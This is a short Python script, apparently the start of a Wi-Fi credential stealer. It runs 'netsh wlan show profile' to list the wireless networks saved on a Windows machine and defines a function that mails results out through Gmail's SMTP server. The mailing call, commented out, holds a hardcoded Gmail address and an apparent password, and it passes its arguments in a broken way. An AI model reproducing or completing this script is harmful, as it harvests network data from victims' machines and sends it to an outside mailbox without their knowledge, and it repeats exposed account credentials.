#!/usr/bin/env python

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
network = subprocess.check_output(command, shell=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", network.decode())


for network_name in network_names:
    print(network_name)
# send_mail(b"detmong18@gmail.com", b"quynh.huynh", network_names)
